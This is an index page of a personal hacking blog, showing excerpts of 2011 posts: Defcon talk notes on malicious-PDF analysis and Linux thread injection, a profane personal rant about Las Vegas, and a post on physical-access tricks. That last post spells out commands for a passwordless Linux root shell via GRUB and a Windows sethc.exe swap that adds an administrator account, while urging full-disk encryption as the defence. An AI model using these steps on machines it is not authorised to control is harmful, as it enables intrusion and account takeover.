<!DOCTYPE html>
<html lang="en">
<head>
    <title>Patterns in the Void</title>
    <meta charset="utf-8" />
    <meta name="robots" 
          content="noindex, nofollow">
    <link rel="stylesheet" 
          href="./theme/css/main.css" 
          type="text/css" />
        <link href="https://blog.patternsinthevoid.net/feeds/all.atom.xml" 
          type="application/atom+xml" 
          rel="alternate" 
          title="Patterns in the Void Atom Feed" />
                <link href="./theme/prettify/prettify.css"
          type="text/css"
          rel="stylesheet" />
    <script type="text/javascript" 
            src="./theme/prettify/prettify.js"></script>
        <noscript>
        <div style="width:80%;">
        <p style="line-height:90%;margin:10px 10px 0px 10px;text-align:justify;text-indent:25px;">
            <small>
            <br>Hey, kudos! You don't run arbitrary scripts either!<br />
            <br>My apologies for the javascript on this page...it's 
            prettify.js for the syntax highlighting in code blocks. 
            I added
            <a href="./theme/prettify/nope.css">one line of CSS</a>
            for you; the rest of this site should work fine.<br />
            <br>&#x24B6;&#38;&#x2665; isis<br /></small>
        </p>
        </div>
        <link href="./theme/prettify/nope.css"
              type="text/css"
              rel="stylesheet" />
    </noscript>

    <!--[if IE]>
        <script src="./theme/js/html5.js">
        </script>
        <![endif]-->

    <!--[if lte IE 7]>
        <link rel="stylesheet" type="text/css" media="all"
              href="./theme/css/ie.css"/>
        <script src="./theme/js/IE8.js"
                type="text/javascript"></script>
        <![endif]-->

    <!--[if lt IE 7]>
        <link rel="stylesheet" type="text/css" media="all"
              href="./theme/css/ie6.css"/>
        <![endif]-->
</head>

<body id="index" class="home" onload="prettyPrint()">
<a href="https://github.com/isislovecruft">
        <img style="position: absolute; top: 0; right: 0; border: 0; max-width: 48px;"
         src="https://blog.patternsinthevoid.net/theme/images/icons/github-tentacle-icon.png"
         alt="code." />
</a>
<header id="banner" class="body">
    <h1>
        <a href="./">Patterns in the Void 
                    </a>
    </h1>
    <nav>
        <ul>
                                                                                    <li >
                <a href="./category/anarchism.html">anarchism</a>
            </li>
                                                                        <li >
                <a href="./category/hacking.html">hacking</a>
            </li>
                                                <li >
                <a href="./category/physics.html">physics</a>
            </li>
                                                <li >
                <a href="./category/travel.html">travel</a>
            </li>
                                </ul>
    </nav>
</header>

<!-- /#banner -->
        
        

 
                <ul>
                        <li class="tag-1"><a href="/tag/cryptography/">cryptography</a></li>
                        <li class="tag-2"><a href="/tag/linux/">linux</a></li>
                        <li class="tag-1"><a href="/tag/Tor/">Tor</a></li>
                        <li class="tag-1"><a href="/tag/artificial intelligence/">artificial intelligence</a></li>
                        <li class="tag-3"><a href="/tag/Defcon/">Defcon</a></li>
                        <li class="tag-3"><a href="/tag/anarchism/">anarchism</a></li>
                        <li class="tag-2"><a href="/tag/crypto-anarchism/">crypto-anarchism</a></li>
                        <li class="tag-2"><a href="/tag/quantum physics/">quantum physics</a></li>
                        <li class="tag-1"><a href="/tag/hacking/">hacking</a></li>
                        <li class="tag-1"><a href="/tag/python/">python</a></li>
                    </ul>
        <section id="content" class="body">
            <ol id="posts-list" class="hfeed" start="2">
                                <li>
                    <article class="hentry">    
                        <header>
                            <h1>
                                <a href="./defcon-report-back-part-1.html" 
                                   rel="bookmark"
                                   title="Permalink to Defcon Report Back, Part 1">Defcon Report Back, Part&nbsp;1</a></h1>
                        </header>
                
                        <div class="entry-content">
                            <footer class="post-info">
        <abbr class="published" title="2011-08-08T23:59:00">
                Monday, 08 August 2011
        </abbr>

                <address class="vcard author">
                By <a class="url fn" href="./author/isis-agora-lovecruft.html">isis agora lovecruft</a>
        </address>
        <p>In <a href="./category/hacking.html">hacking</a> </p>
<p>tags: <a href="./tag/assembly-languages.html">assembly languages </a><a href="./tag/defcon.html">Defcon </a><a href="./tag/javascript.html">javascript </a><a href="./tag/jugaad.html">jugaad </a><a href="./tag/kernel-exploitation.html">Kernel Exploitation </a><a href="./tag/las-vegas.html">las vegas </a><a href="./tag/libhijack.html">libhijack </a><a href="./tag/linux-thread-injection.html">linux thread injection </a><a href="./tag/malicious-pdf.html">malicious pdf </a><a href="./tag/mmap-syscall.html">mmap syscall </a><a href="./tag/port-scan.html">port scan </a><a href="./tag/ptrace.html">ptrace </a><a href="./tag/python.html">python </a><a href="./tag/runtime-process-library-injection.html">runtime process library injection </a><a href="./tag/shellcode.html">shellcode </a><a href="./tag/sptrace.html">sptrace </a><a href="./tag/strace.html">strace </a><a href="./tag/umap.html">Umap </a><a href="./tag/upnp.html">UPnP </a></p>
</footer><!-- /.post-info -->                            <p>Friday 5^th^ August 2011, Defcon 19, Las&nbsp;Vegas</p>
<h2>Analyzing Embedded Malicious Code in&nbsp;PDFs</h2>
<p>So, the first was Mahmud Ab Rahman&#8217;s presentation <a href="www.giac.org/paper/gpen/3418/malicious-pdf-analysis/121349">on parsing and
analyzing malacious code embedded in .pdfs</a>. I can&#8217;t guarantee that
paper doesn&#8217;t have anything malicious embedded. But I have used a .pdf
parser written in python by <a href="https://DidierStevens.com">Didier Stevens</a> and been very confused
about .pdf code structure, so Ab Rahman&#8217;s Sneaky <span class="caps">PDF</span> lecture was highly
enlightening. I can&#8217;t find video for that presentation up yet, but that
.pdf above does contain everything said and the original slides.
Basically, malicious .pdfs use JavaScript code obfuscation through
spaghetti code, infinite loops, misdirected object references, code
encryption, and media-rich embedded objects such as flash videos or
audio files. Ab Rahman gave a few lists of tools which he used to better
parse and de-obfuscate: tools such as <a href="https://developer.mozilla.org/en/SpiderMonkey">SpiderMonkey</a>, <a href="https://www.mozilla.org/rhino/">Rhino</a>,
<a href="https://code.google.com/p/v8/">V8</a>, and <a href="http://jsbeautifier.org/">JSBeautifier</a> can all be used to fix spaghetti code,
infinite loops, and misdirected object references, and tools like
<a href="www.unixuser.org/~euske/python/pdfminer/">PDFminer</a>, <a href="https://gallus.honeynet.org.my/">Gallus</a>, <a href="http://news.wepawet.cs.ucsb.edu/">Wepawet</a>, <a href="http://aptdeezer.xecure-lab.com/">APTdeezer</a>, and <a href="http://esec-lab.sogeti.com/pages/Origami">Origami</a>
can be used in addition to Didier Steven&#8217;s above referenced tool for
parsing. Also, I found <a href="http://www.decalage.info/file_formats_security/pdf">an entire site on <span class="caps">PDF</span> security issues</a>, with
lists of relevant tools and white papers which go into more detail on
obfuscation and detection&nbsp;methods.</p>
<h2>Linux Thread&nbsp;Injection</h2>
<p>Aseem “@” Jakhar presented on <a href="http://null.co.in/section/atheneum/projects/">Jugaad</a>, a newly released Linux Thread
Injection kit, which uses the <a href="https://secure.wikimedia.org/wikipedia/en/wiki/Ptrace">ptrace() function</a> in <a href="https://secure.wikimedia.org/wikipedia/en/wiki/Gdb">gdb</a> to inject
arbitrary code into running processes. <a href="http://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Jakhar-Jugaad-Linux-Thread-Injection.pdf">Here&#8217;s the pdf</a> of his ...</p>
                            <a class="readmore" href="./defcon-report-back-part-1.html">read more</a>
                                                    </div><!-- /.entry-content -->
                </article>
                </li>
                                                

 
                        <li>
                    <article class="hentry">    
                        <header>
                            <h1>
                                <a href="./defcon-report-back-intro.html" 
                                   rel="bookmark"
                                   title="Permalink to Defcon Report Back, Intro">Defcon Report Back,&nbsp;Intro</a></h1>
                        </header>
                
                        <div class="entry-content">
                            <footer class="post-info">
        <abbr class="published" title="2011-08-08T15:28:00">
                Monday, 08 August 2011
        </abbr>

                <address class="vcard author">
                By <a class="url fn" href="./author/isis-agora-lovecruft.html">isis agora lovecruft</a>
        </address>
        <p>In <a href="./category/hacking.html">hacking</a> </p>
<p>tags: <a href="./tag/black-hat-con.html">black hat con </a><a href="./tag/certificate-authority.html">certificate authority </a><a href="./tag/convergenge.html">convergenge </a><a href="./tag/defcon.html">Defcon </a><a href="./tag/dr-zoz.html">dr. zoz </a><a href="./tag/fuck-them.html">fuck them </a><a href="./tag/gender-identity.html">gender identity </a><a href="./tag/hacking.html">hacking </a><a href="./tag/las-vegas.html">las vegas </a><a href="./tag/security.html">security </a></p>
</footer><!-- /.post-info -->                            <p>I&#8217;m sitting in McCarren Internation Airport in <a href="http://www.uwec.edu/geography/ivogeler/w188/lasvegas/v18.htm">Las Vegas, Nevada</a>,
killing the next two hours over a slow 3G connection. This was my first
time going to <a href="https://www.defcon.org/html/defcon-19/dc-19-index.html">Defcon</a>. I remember watching videos of Defcon talks on
my home-built computer when I was nine or so. In fifth grade, I had a
crush on <a href="http://web.mit.edu/newsoffice/2002/crops-1009.html">Zoz</a>. I don&#8217;t remember why I thought they were the shit –
maybe it was the
skinny-nerdy-queerish-blond-mohawk-hacker-person-who-makes-fake-crop-circles-for-their-Ph.D.-thesis
thing. I really wanted to go to <span class="caps">MIT</span> at that age, and Zoz was my hero.
Hey, don&#8217;t make fun of me. I was nine,&nbsp;okay?</p>
<p>Hop in your <a href="http://hacks.mit.edu/by_year/2010/tardis/">blue telephone box</a> and skip forward a decade or so, and
I&#8217;m at my first Defcon. It was also my first time staying in Las Vegas.
Fuck this town. It&#8217;s everything that went wrong with capitalism
amplified and tarballed into a single sexism-infected package, wrapped
in a sick slime of wealth, extreme classism, greed, extra sexism (for
good measure), and a heaping sporkful of objectification of
female-bodied folk on the side. Fuck. You. Las.&nbsp;Vegas.</p>
<p>And fuck everyone who assumes that I&#8217;m a girl because I currently live
in a female-body. Fuck all the time burglars who think it&#8217;s okay to talk
to me without asking if I feel social. Fuck the bro-”hacker”s who think
it&#8217;s okay to buy me drinks – and then try to talk to me! – as if I
desired either one. Fuck the goon who asked if ...</p>
                            <a class="readmore" href="./defcon-report-back-intro.html">read more</a>
                                                    </div><!-- /.entry-content -->
                </article>
                </li>
                                                

 
                        <li>
                    <article class="hentry">    
                        <header>
                            <h1>
                                <a href="./cute-physical-access-tricks.html" 
                                   rel="bookmark"
                                   title="Permalink to Cute Physical Access Tricks">Cute Physical Access&nbsp;Tricks</a></h1>
                        </header>
                
                        <div class="entry-content">
                            <footer class="post-info">
        <abbr class="published" title="2011-08-02T11:11:00">
                Tuesday, 02 August 2011
        </abbr>

                <address class="vcard author">
                By <a class="url fn" href="./author/isis-agora-lovecruft.html">isis agora lovecruft</a>
        </address>
        <p>In <a href="./category/hacking.html">hacking</a> </p>
<p>tags: <a href="./tag/hacking.html">hacking </a><a href="./tag/linux.html">linux </a><a href="./tag/password-reset.html">password reset </a><a href="./tag/physical-access-tricks.html">physical access tricks </a><a href="./tag/privilege-escalation.html">privilege escalation </a><a href="./tag/root-shell.html">root shell </a><a href="./tag/windows.html">windows </a></p>
</footer><!-- /.post-info -->                            <p>They&#8217;re cute because they&#8217;re so adorably&nbsp;simplistic:</p>
<p>If you have physical access to a Linux box,&nbsp;do:</p>
<p><code>Press ESC at the grub prompt.</code></p>
<p>Press e for&nbsp;edit.</p>
<p>Highlight the line that begins kernel ………, press&nbsp;e</p>
<p>Go to the very end of the line, add rw&nbsp;init=/bin/bash</p>
<p>press enter, then press b to boot your&nbsp;system.</p>
<p>Your system will boot up to a passwordless root&nbsp;shell.</p>
<p>For situations with physical access to a Windows box, boot into a live
Linux <span class="caps">USB</span>/<span class="caps">CD</span> and&nbsp;do:</p>
<p><code>mkdir /mnt/ntfs</code></p>
<p>mount -t captive-ntfs /dev/hda1&nbsp;/mnt/ntfs</p>
<p>cd&nbsp;/mnt/ntfs/windows/system32</p>
<p>mv sethc.exe sethc.old; cp cmd.exe&nbsp;sethc.exe</p>
<p>sync</p>
<p>cd&nbsp;\~</p>
<p>umount&nbsp;/mnt/ntfs</p>
<p>shutdown&nbsp;–r</p>
<p>Then, in the shell which appears, make an admin account by&nbsp;doing:</p>
<p><code>NET USER admin password /add</code></p>
<p><span class="caps">NET</span> <span class="caps">LOCALGROUP</span> administrators admin&nbsp;/add</p>
<p>Of course, neither of these work if you&#8217;re using full-disk encryption.
So, Windows users: <a href="http://www.truecrypt.org/">use TrueCrypt</a>! And Linux users: use <a href="http://www.makeuseof.com/tag/encrypt-your-files-in-linux-with-ecryptfs/">ecryptfs</a>
and<a href="http://www.adamsinfo.com/linux-luks-crypt-howto/">luks</a>! Dualbooters can <a href="http://ubuntuforums.org/showthread.php?t=761530">use this tutorial</a>. And Mac users&#8230;from
my understanding, you&#8217;re fucked and there&#8217;s no way to full-disk encrypt
a Mac, but I don&#8217;t use Macs, so I could be wrong. Hey, it&#8217;s the price
you pay for having a hipster computer.&nbsp;/snark!</p>
<p>And full-disk encryption doesn&#8217;t void flaws in physical security issues,
such as presented in the Evil Maid or Cold Boot attacks. Duh. If they
can physically get to your computer, especially if they can get to ...</p>
                            <a class="readmore" href="./cute-physical-access-tricks.html">read more</a>
                                                    </div><!-- /.entry-content -->
                </article>
                </li>
                                            </ol><!-- /#posts-list -->
                        <p class="paginator">
                        <a href="./index13.html">&laquo;</a>
                Page 14 / 28
            <a href="./index15.html">&raquo;</a>
    </p>
                    </section><!-- /#content -->
                                <section id="extras" 
         class="body">
        <div class="blogroll">
        <h2>blogroll</h2>
        <ul>
                        <li><a href="https://fyb.patternsinthevoid.net">main</a></li>
                        <li><a href="https://blog.patternsinthevoid.net/isis.txt">keys</a></li>
                        <li><a href="https://code.patternsinthevoid.net">code</a></li>
                        <li><a href="https://blog.patternsinthevoid.net/calendar.html">time</a></li>
                        <li><a href="https://blog.patternsinthevoid.net/about.html">about</a></li>
                    </ul>
    </div>
    <!-- /.blogroll -->
            <div class="social">
        <h2>social</h2>
        <ul>
            <li><a href="https://blog.patternsinthevoid.net/feeds/all.atom.xml" 
                   type="application/atom+xml" 
                   rel="alternate">atom feed</a>
            </li>
                        
                        <li><a href="https://twitter.com/#!/isislovecruft">Twitter</a></li>
                        <li><a href="https://github.com/isislovecruft">Github</a></li>
                    </ul>
    </div><!-- /.social -->
    </section><!-- /#extras -->
<footer id="contentinfo" class="body" position="relative">
    <div style="height: 100%">
        <address id="about">
                <iframe src="//crypto.stanford.edu/flashproxy/embed.html" 
        width="80" height="15"
        frameborder="0" scrolling="no"
        accesskey="i"
        display="none"
        groove>
</iframe>
<div id="over">You're currently helping people in censored regions with <a href="https://crypto.stanford.edu/flashproxy/options.html">FlashProxy</a>. Thanks!</div>                </address><!-- /#about -->
    </div>
</footer><!-- /#contentinfo -->
</body>
</html>